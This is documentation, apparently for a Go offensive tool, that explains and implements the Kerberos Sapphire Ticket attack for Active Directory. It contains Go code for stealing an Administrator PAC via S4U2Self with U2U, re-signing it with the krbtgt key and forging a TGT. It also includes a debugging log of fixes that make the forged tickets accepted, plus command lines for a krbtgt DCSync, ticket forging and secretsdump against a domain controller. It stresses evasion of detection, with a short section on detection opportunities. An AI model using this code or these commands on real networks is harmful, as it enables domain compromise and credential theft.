# Sapphire Ticket Attack Implementation

> A deep technical dive into the most stealthy Kerberos privilege escalation technique

## Table of Contents

1. [Overview](#overview)
2. [Attack Theory](#attack-theory)
3. [Comparison with Other Ticket Forgery Techniques](#comparison-with-other-ticket-forgery-techniques)
4. [Implementation Deep Dive](#implementation-deep-dive)
5. [Protocol Flow](#protocol-flow)
6. [ASN.1 Challenges and Solutions](#asn1-challenges-and-solutions)
7. [PAC Handling](#pac-handling)
8. [Debugging Journey](#debugging-journey)
9. [Usage Examples](#usage-examples)
10. [Detection Considerations](#detection-considerations)
11. [References](#references)

---

## Overview

A **Sapphire Ticket** is a forged Ticket Granting Ticket (TGT) that contains a **real PAC** stolen from another user—typically a high-privilege account like Domain Admin. Unlike Golden or Diamond tickets which create or modify PACs, Sapphire tickets transplant an authentic PAC from the target user, making them virtually undetectable by security tools that validate PAC consistency against Active Directory.

### Why "Sapphire"?

The naming follows the gem theme of advanced Kerberos attacks:

- **Golden Ticket**: Forges TGT from scratch with fabricated PAC
- **Silver Ticket**: Forges TGS with fabricated PAC
- **Diamond Ticket**: Gets real TGT, modifies the PAC
- **Sapphire Ticket**: Gets real TGT, steals real PAC from another user

Sapphire is the "purest" forgery—every component is legitimate except for the combination.

---

## Attack Theory

### The Core Insight

The Sapphire attack exploits **S4U2Self with User-to-User (U2U) authentication** to obtain a service ticket containing the target user's real PAC, then **transplants that PAC** into a TGT we control.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SAPPHIRE TICKET ATTACK FLOW                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Step 1: Get TGT for Low-Priv User                                         │
│  ┌─────────────────┐                                                        │
│  │   Attacker      │  AS-REQ/AS-REP                                         │
│  │   (lowpriv)     │ ───────────────────────> KDC                           │
│  │                 │ <─────────────────────── TGT + SessionKey              │
│  └─────────────────┘                                                        │
│                                                                             │
│  Step 2: S4U2Self + U2U to Get Admin's PAC                                  │
│  ┌─────────────────┐                                                        │
│  │   Attacker      │  TGS-REQ (S4U2Self + ENC-TKT-IN-SKEY)                   │
│  │   "I want a     │ ───────────────────────> KDC                           │
│  │    ticket for   │                          │                             │
│  │    Administrator│                          │ Creates service ticket      │
│  │    to my SPN"   │                          │ with Admin's REAL PAC       │
│  │                 │ <─────────────────────── │                             │
│  │   Encrypted     │  Service Ticket encrypted with OUR session key!       │
│  │   with our key! │                                                        │
│  └─────────────────┘                                                        │
│                                                                             │
│  Step 3: Extract Admin's PAC                                                │
│  ┌─────────────────┐                                                        │
│  │  Decrypt S4U    │                                                        │
│  │  service ticket │  Uses our TGT session key (we know it!)               │
│  │  with session   │ ─────> Parse EncTicketPart ─────> Extract PAC          │
│  │  key            │                                                        │
│  └─────────────────┘                                                        │
│                                                                             │
│  Step 4: Decrypt Original TGT                                               │
│  ┌─────────────────┐                                                        │
│  │  Decrypt our    │                                                        │
│  │  TGT with       │  Uses krbtgt key (from DCSync)                        │
│  │  krbtgt key     │ ─────> Get EncTicketPart with our PAC                  │
│  └─────────────────┘                                                        │
│                                                                             │
│  Step 5: Replace PAC in TGT                                                 │
│  ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐                │
│  │  Our TGT's      │ │  Remove our     │ │  Insert Admin's │                │
│  │  EncTicketPart  │→│  lowpriv PAC    │→│  stolen PAC     │                │
│  └─────────────────┘ └─────────────────┘ └─────────────────┘                │
│                                                                             │
│  Step 6: Re-encrypt and Rebuild TGT                                         │
│  ┌─────────────────┐                                                        │
│  │  Encrypt with   │  Uses krbtgt key (key usage 2)                        │
│  │  krbtgt key     │ ─────> Valid TGT with Admin's real groups!            │
│  └─────────────────┘                                                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Why U2U is Critical

Normal S4U2Self returns a ticket encrypted with the **service's long-term key**. Since we're a user (not a computer account with an SPN), we don't have a service key.

**User-to-User (U2U)** solves this:

- We include our TGT in `additional-tickets` field
- We set the `ENC-TKT-IN-SKEY` KDC option flag
- The KDC encrypts the resulting ticket with **our TGT's session key** instead of a service key
- Since we know our session key, we can decrypt the ticket and extract the PAC!

---

## Comparison with Other Ticket Forgery Techniques

| Aspect | Golden Ticket | Diamond Ticket | Sapphire Ticket |
|--------|---------------|----------------|-----------------|
| **PAC Source** | Fabricated | Modified real PAC | Stolen real PAC |
| **Groups** | Invented (may not exist) | Real + added fake | 100% real from AD |
| **Timestamps** | Attacker-controlled | Original + modifications | Original from KDC |
| **SIDs** | May be fabricated | Mix of real/fake | All genuine |
| **AD Correlation** | ❌ Mismatch detectable | ❌ Additions detectable | ✅ Perfect match |
| **Requires** | krbtgt key | krbtgt key + TGT | krbtgt key + any user creds |
| **Detection Risk** | High | Medium | Low |

### Why Sapphire is Stealthier

1. **PAC-AD Consistency**: Security tools comparing PAC contents to Active Directory see no discrepancy
2. **Valid SIDs**: All group memberships actually exist in the directory
3. **Authentic Timestamps**: PAC creation times come from real KDC issuance
4. **KDC Signatures**: The original PAC was signed by the real KDC (though we re-sign)

---

## Implementation Deep Dive

### File Structure

```
pkg/
├── forge/
│   └── sapphire.go      # Main Sapphire implementation (1328 lines)
├── client/
│   └── s4u.go           # S4U2Self/S4U2Proxy with U2U support
├── pac/
│   ├── pac.go           # PAC structure definitions
│   └── resign.go        # PAC re-signing logic
└── crypto/
    └── aes.go           # AES-CTS-HMAC-SHA1 encryption
```

### Core Data Structures

```go
// SapphireTicketRequest - Input configuration
type SapphireTicketRequest struct {
    // Domain information
    Domain    string
    DomainSID string

    // User to authenticate as (low-priv user)
    Username string
    Password string
    NTHash   []byte

    // User to impersonate (whose PAC we steal)
    Impersonate string // e.g., "Administrator"

    // krbtgt key for signing (required)
    KrbtgtNTHash []byte
    KrbtgtAES256 []byte  // Preferred - 32 bytes
    KrbtgtAES128 []byte

    // Optional: pre-existing TGT
    TGT        *ticket.Kirbi
    SessionKey []byte

    // Connection
    KDC string
}
```

### The Main Attack Function

```go
func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*SapphireTicketResult, error) {
    // Step 1: Get TGT for low-priv user
    // Uses native AS exchange (not gokrb5) for correct session key handling
    
    // Step 2: S4U2self + U2U to get impersonated user's PAC
    // Returns ticket encrypted with OUR session key
    
    // Step 3: Extract PAC from S4U ticket
    // Decrypt with session key, parse EncTicketPart, find AD-WIN2K-PAC
    
    // Step 4: Decrypt original TGT with krbtgt key
    // Get raw bytes to preserve GeneralString encoding
    
    // Step 5: Re-sign PAC with krbtgt key
    // Original PAC signed with session key, need krbtgt signature
    
    // Step 6: Replace PAC in TGT
    // Raw bytes manipulation or struct-based with GeneralString fixup
    
    // Step 7: Re-encrypt and rebuild TGT
    // Encrypt with krbtgt key (key usage 2)
}
```

---

## Protocol Flow

### Step 1: AS Exchange (Get TGT)

Standard Kerberos AS exchange to obtain a TGT for our low-privilege user.

```
AS-REQ:
├── pvno: 5
├── msg-type: 10 (AS-REQ)
├── padata:
│   ├── PA-ENC-TIMESTAMP (encrypted with user's key)
│   └── PA-PAC-REQUEST (true)
├── req-body:
│   ├── kdc-options: forwardable, renewable, canonicalize
│   ├── cname: lowpriv
│   ├── realm: CORP.LOCAL
│   ├── sname: krbtgt/CORP.LOCAL
│   ├── till: <10 hours from now>
│   ├── nonce: <random>
│   └── etype: [18, 17, 23]  # AES256, AES128, RC4
```

```
AS-REP:
├── pvno: 5
├── msg-type: 11 (AS-REP)
├── crealm: CORP.LOCAL
├── cname: lowpriv
├── ticket: <TGT encrypted with krbtgt key>
└── enc-part: <session key, times, etc. encrypted with user's key>
```

**Critical**: We extract the **session key** from the encrypted enc-part. This is the key we'll use to decrypt the S4U2Self ticket later.

### Step 2: S4U2Self + U2U (TGS Exchange)

This is the core of the attack. We request a service ticket "for" Administrator "to" our own principal, with U2U encryption.

```
TGS-REQ:
├── pvno: 5
├── msg-type: 12 (TGS-REQ)
├── padata:
│   ├── PA-TGS-REQ:
│   │   └── Authenticator encrypted with session key
│   └── PA-FOR-USER:
│       ├── userName: administrator
│       ├── userRealm: CORP.LOCAL (lowercase!)
│       ├── cksum: HMAC-MD5 checksum
│       └── auth-package: "Kerberos"
├── req-body:
│   ├── kdc-options: 0x40810018
│   │   ├── FORWARDABLE
│   │   ├── RENEWABLE
│   │   ├── CANONICALIZE
│   │   ├── ENC-TKT-IN-SKEY  <-- U2U flag!
│   │   └── CNAME-IN-ADDL-TKT
│   ├── realm: CORP.LOCAL
│   ├── sname: lowpriv (NT-UNKNOWN type 0)  <-- Request to ourselves
│   ├── till: <10 hours>
│   ├── nonce: <random>
│   ├── etype: [18, 23]
│   └── additional-tickets:  <-- Our TGT for U2U
│       └── <our TGT>
```

**KDC Options Breakdown (0x40810018)**:

- Bit 1 (0x40000000): FORWARDABLE
- Bit 7 (0x00800000): RENEWABLE  
- Bit 15 (0x00010000): CANONICALIZE
- Bit 27 (0x00000010): CNAME-IN-ADDL-TKT
- Bit 28 (0x00000008): ENC-TKT-IN-SKEY (U2U)

### Step 3: TGS-REP Decryption

The KDC returns a service ticket with Administrator's PAC, encrypted with our TGT's session key!

```
TGS-REP:
├── ticket:
│   ├── tkt-vno: 5
│   ├── realm: CORP.LOCAL
│   ├── sname: lowpriv
│   └── enc-part:  <-- Encrypted with OUR session key (U2U)
│       └── EncTicketPart:
│           ├── flags
│           ├── key: <new session key>
│           ├── crealm: CORP.LOCAL
│           ├── cname: Administrator  <-- Impersonated user!
│           └── authorization-data:
│               └── AD-IF-RELEVANT:
│                   └── AD-WIN2K-PAC:  <-- Administrator's real PAC!
│                       ├── LOGON_INFO: <Admin's groups, SIDs>
│                       ├── CLIENT_INFO
│                       ├── SERVER_CHECKSUM
│                       └── KDC_CHECKSUM
```

### Step 4-7: PAC Transplant

We now:

1. Decrypt the S4U ticket using our session key (key usage 2)
2. Extract the PAC from authorization-data
3. Decrypt our original TGT using the krbtgt key
4. Replace our PAC with Administrator's PAC
5. Re-sign the PAC with krbtgt key
6. Re-encrypt the EncTicketPart with krbtgt key
7. Rebuild the ticket structure

---

## ASN.1 Challenges and Solutions

Go's `encoding/asn1` package has several incompatibilities with Kerberos:

### Challenge 1: GeneralString Encoding

Kerberos requires `GeneralString` (ASN.1 tag `0x1b`) for realm and principal name strings. Go's package uses `PrintableString` (tag `0x13`).

**Solution**: Post-process marshaled bytes to fix string tags:

```go
// fixPrintableToGeneralString converts 0x13 tags to 0x1b
func fixPrintableToGeneralString(data []byte) []byte {
    result := make([]byte, len(data))
    copy(result, data)
    fixASN1StringTags(result, 0)
    return result
}

func fixASN1StringTags(data []byte, offset int) {
    for offset < len(data) {
        tag := data[offset]
        // ... parse length and content ...
        
        // Convert PrintableString to GeneralString
        if tag == 0x13 {
            data[offset] = 0x1b
        }
        
        // Recurse into constructed types
        if isConstructed(tag) && contentLen > 0 {
            fixASN1StringTags(data, contentStart)
        }
        
        offset = contentStart + contentLen
    }
}
```

### Challenge 2: APPLICATION Tag Handling

Kerberos uses APPLICATION implicit tags that Go doesn't handle well for parsing.

**Solution**: Manual parsing for critical structures:

```go
// extractTicketEncPart extracts etype and cipher from raw ticket bytes
// Ticket ::= APPLICATION 1 -> SEQUENCE { [0] tkt-vno, [1] realm, [2] sname, [3] enc-part }
func extractTicketEncPart(data []byte) (etype int32, cipher []byte, err error) {
    if data[0] != 0x61 { // APPLICATION 1
        return 0, nil, fmt.Errorf("not a valid ticket")
    }
    
    // Skip APPLICATION 1 header
    pos := skipHeader(data)
    
    // Skip SEQUENCE header
    pos = skipSequenceHeader(data, pos)
    
    // Parse fields to find [3] enc-part
    for pos < len(data) {
        tag := int(data[pos] - 0xa0)
        fieldLen, contentPos := parseLength(data, pos)
        
        if tag == 3 { // enc-part
            return parseEncryptedData(data[contentPos : contentPos+fieldLen])
        }
        
        pos = contentPos + fieldLen
    }
}
```

### Challenge 3: Preserving Original Encoding

When modifying a ticket, we must preserve the original byte-level encoding to avoid KDC rejection.

**Solution**: `decryptTGTRaw()` returns original decrypted bytes without Go's re-encoding:

```go
// decryptTGTRaw returns the ORIGINAL decrypted bytes
// This is critical to avoid GeneralString encoding issues
func decryptTGTRaw(tgt *ticket.Kirbi, krbtgtKey []byte, etype int32) ([]byte, error) {
    // Get raw ticket bytes
    ticketRaw := tgt.Cred.Tickets[0].RawBytes
    
    // Extract enc-part
    _, cipher, err := extractTicketEncPart(ticketRaw)
    
    // Decrypt - return ORIGINAL bytes, no re-marshaling!
    return decryptWithKey(cipher, krbtgtKey, 2, etype)
}
```

---

## PAC Handling

### PAC Structure

```
PACTYPE:
├── cBuffers: 5-10 (number of buffers)
├── Version: 0
└── Buffers[]:
    ├── PAC_LOGON_INFO (type 1) - User's group memberships
    ├── PAC_CLIENT_INFO (type 10) - Client name, auth time
    ├── PAC_UPN_DNS_INFO (type 12) - UPN and DNS domain
    ├── PAC_SERVER_CHECKSUM (type 6) - Signed by service key
    ├── PAC_KDC_CHECKSUM (type 7) - Signed by krbtgt key
    ├── PAC_REQUESTOR (type 18) - User SID (KB5008380)
    └── PAC_ATTRIBUTES_INFO (type 17) - Ticket attributes
```

### PAC Re-signing

The stolen PAC was signed by the session key (for S4U2Self). We must re-sign with krbtgt:

```go
func ResignPAC(pacData []byte, krbtgtKey []byte, etype int32) ([]byte, error) {
    // Parse PAC structure
    pac := parsePAC(pacData)
    
    // Find SERVER_CHECKSUM and KDC_CHECKSUM buffers
    for _, buf := range pac.Buffers {
        switch buf.Type {
        case ServerChecksumType:
            // Zero out signature bytes
            zeroSignature(buf.Data)
        case KDCChecksumType:
            // Zero out signature bytes  
            zeroSignature(buf.Data)
        }
    }
    
    // Compute SERVER_CHECKSUM over entire PAC (with zeroed checksums)
    serverSig := computeChecksum(krbtgtKey, pac.RawData, etype)
    
    // Compute KDC_CHECKSUM over server signature
    kdcSig := computeChecksum(krbtgtKey, serverSig, etype)
    
    // Insert new signatures
    insertSignature(pac, ServerChecksumType, serverSig)
    insertSignature(pac, KDCChecksumType, kdcSig)
    
    return pac.RawData, nil
}
```

### Finding PAC in Authorization Data

The PAC is nested inside `AD-IF-RELEVANT` (type 1) containing `AD-WIN2K-PAC` (type 128):

```go
func findPACInAuthData(authData asn1krb5.AuthorizationData) []byte {
    for _, ad := range authData {
        if ad.ADType == 1 { // AD-IF-RELEVANT
            // Parse nested authorization-data
            var nested asn1krb5.AuthorizationData
            asn1.Unmarshal(ad.ADData, &nested)
            if found := findPACInAuthData(nested); found != nil {
                return found
            }
        } else if ad.ADType == 128 { // AD-WIN2K-PAC
            return ad.ADData
        }
    }
    return nil
}
```

---

## Debugging Journey

### Problem 1: Session Key Mismatch

**Symptom**: `KRB_AP_ERR_MODIFIED` when using forged ticket

**Cause**: gokrb5 library was returning a different session key than what the KDC actually used.

**Solution**: Implemented native AS exchange that properly decrypts and extracts the session key:

```go
// NativeASExchange performs AS-REQ/AS-REP without gokrb5
func NativeASExchange(ctx context.Context, domain, username, password, kdc string) (*NativeASResult, error) {
    // Build AS-REQ manually
    asReq := buildNativeASREQ(domain, username)
    
    // Send and receive
    respBytes := sendToKDC(asReq)
    
    // Parse AS-REP manually
    // Extract session key from enc-part using OUR password-derived key
    sessionKey := decryptASRepEncPart(respBytes, password, domain, username)
    
    return &NativeASResult{
        Ticket:     parseTicket(respBytes),
        SessionKey: sessionKey,
    }
}
```

### Problem 2: KRB_AP_ERR_BADMATCH

**Symptom**: Impacket's `smbclient.py` fails with `KRB_AP_ERR_BADMATCH`

**Cause**: The `cname` inside the encrypted `EncTicketPart` still contained the low-priv user's name, while the ccache file had Administrator.

**Solution**: Update the cname when replacing the PAC:

```go
// CRITICAL: Change the cname in EncTicketPart to the impersonated user!
modifiedEncPart.CName = asn1krb5.PrincipalName{
    NameType:   asn1krb5.NTPrincipal,
    NameString: []string{req.Impersonate},
}

// Also update CredInfo for ccache export consistency
newTGT.CredInfo.TicketInfo[0].PName = asn1krb5.PrincipalName{
    NameType:   asn1krb5.NTPrincipal,
    NameString: []string{req.Impersonate},
}
```

### Problem 3: PA-FOR-USER Checksum

**Symptom**: `KDC_ERR_S_PRINCIPAL_UNKNOWN`

**Cause**: PA-FOR-USER checksum was computed incorrectly.

**Solution**: Use lowercase for the S4UByteArray per MS-SFU spec:

```go
// Use lowercase to match Impacket's working implementation
lowerUser := strings.ToLower(targetUser)
lowerRealm := strings.ToLower(targetRealm)

var checksumData []byte
checksumData = append(checksumData, nameTypeLE...)  // 4-byte little-endian
checksumData = append(checksumData, []byte(lowerUser)...)
checksumData = append(checksumData, []byte(lowerRealm)...)
checksumData = append(checksumData, []byte("Kerberos")...)

// Compute HMAC-MD5 with checksum type -138
cksum := computeHMACMD5(sessionKey, checksumData, 17)
```

### Problem 4: Raw Bytes vs. Struct Approach

**Symptom**: KDC rejected tickets when PAC size changed

**Cause**: Changing the PAC size requires updating all parent ASN.1 length fields, which is complex.

**Solution**: Dual approach with fallback:

```go
// Try raw bytes approach first (preserves all GeneralString encoding)
modifiedBytes, err := replacePACInRawBytes(decryptedTGTBytes, resignedPAC)
if err != nil {
    // Fall back to struct approach with GeneralString fixup
    modifiedEncPart, _ := replacePAC(decryptedTGT, resignedPAC)
    marshaled, _ := asn1.Marshal(*modifiedEncPart)
    modifiedBytes = fixPrintableToGeneralString(marshaled)
}
```

---

## Usage Examples

### Basic Sapphire Ticket Forging

```bash
# Get krbtgt key first via DCSync
goobeus -d corp.local -u admin -p 'AdminPass!' dcsync --user krbtgt --dc dc01.corp.local

# Forge Sapphire ticket
goobeus -d corp.local -u lowpriv -p 'LowPrivPass!' sapphire \
  --krbtgt <aes256_key> \
  --impersonate Administrator \
  --sid S-1-5-21-1234567890-1234567890-1234567890 \
  -o admin.ccache

# Use with Impacket
export KRB5CCNAME=admin.ccache
smbclient.py -k -no-pass corp.local/Administrator@dc01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Using Existing TGT

```bash
# If you already have a TGT (e.g., from tgtdeleg)
goobeus sapphire \
  --ticket lowpriv.kirbi \
  --krbtgt <aes256_key> \
  --impersonate Administrator \
  --domain corp.local \
  -o admin.ccache
```

### Library Usage

```go
import (
    "github.com/goobeus/goobeus/pkg/forge"
)

result, err := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketRequest{
    Domain:       "corp.local",
    DomainSID:    "S-1-5-21-...",
    Username:     "lowpriv",
    Password:     "LowPrivPass!",
    Impersonate:  "Administrator",
    KrbtgtAES256: krbtgtKey,
    KDC:          "dc01.corp.local",
})

// Save as ccache for Impacket
ticket.SaveCCache(result.Kirbi, "admin.ccache")
```

---

## Detection Considerations

### What Sapphire Tickets Avoid

| Detection Method | Golden | Diamond | Sapphire |
|------------------|--------|---------|----------|
| PAC vs AD group mismatch | ❌ Detected | ❌ Detected | ✅ Evades |
| Fabricated SIDs | ❌ Detected | ⚠️ Partial | ✅ Evades |
| PAC timestamp anomalies | ❌ Detected | ⚠️ Partial | ✅ Evades |
| Missing PAC fields | ⚠️ Depends | ✅ Evades | ✅ Evades |

### Potential Detection Opportunities

1. **S4U2Self Event Correlation**
   - Event 4769 shows S4U delegation requests
   - Unusual pattern: S4U2Self to a user principal (not computer SPN)

2. **Network Traffic Analysis**
   - U2U requests are uncommon in normal enterprise traffic
   - Request pattern: AS-REQ → TGS-REQ (S4U+U2U) → immediate use of different identity

3. **Behavioral Analysis**
   - Low-privilege user suddenly using Administrator ticket
   - Ticket used from unexpected location/time

4. **krbtgt Key Monitoring**
   - Detection of krbtgt key extraction (DCSync)
   - Unusual access to krbtgt account

---

## Key Usage Values (RFC 4120)

| Usage | Description | Where Used |
|-------|-------------|------------|
| 2 | Ticket encryption | EncTicketPart with service key |
| 3 | AS-REP encrypted part | Session key in AS response |
| 7 | PA-TGS-REQ authenticator | TGS-REQ authenticator |
| 8 | TGS-REP encrypted part | Session key in TGS response |
| 11 | AP-REQ authenticator | Service authentication |
| 17 | HMAC-MD5 checksum | PA-FOR-USER checksum |

---

## References

### Standards and Specifications

- [RFC 4120](https://tools.ietf.org/html/rfc4120) - The Kerberos Network Authentication Service (V5)
- [RFC 4757](https://tools.ietf.org/html/rfc4757) - RC4-HMAC Kerberos Encryption
- [MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/) - Kerberos Protocol Extensions
- [MS-SFU](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/) - Service for User Protocol Extensions
- [MS-PAC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/) - Privilege Attribute Certificate

### Research and Tools

- [Rubeus](https://github.com/GhostPack/Rubeus) - C# Kerberos toolkit by @harmj0y
- [Impacket](https://github.com/fortra/impacket) - Python network protocol library
- [Charlie Clark's Sapphire Research](https://www.semperis.com/blog/a-diamond-in-the-ruff-an-overview-of-sapphire-tickets/) - Original Sapphire ticket research

### Related Goobeus Documentation

- [KERBEROS_101.md](KERBEROS_101.md) - Kerberos fundamentals
- [TICKETS.md](TICKETS.md) - Ticket structure and formats
- [DCSYNC.md](DCSYNC.md) - DCSync for extracting krbtgt key
- [DELEGATION.md](DELEGATION.md) - S4U delegation mechanisms
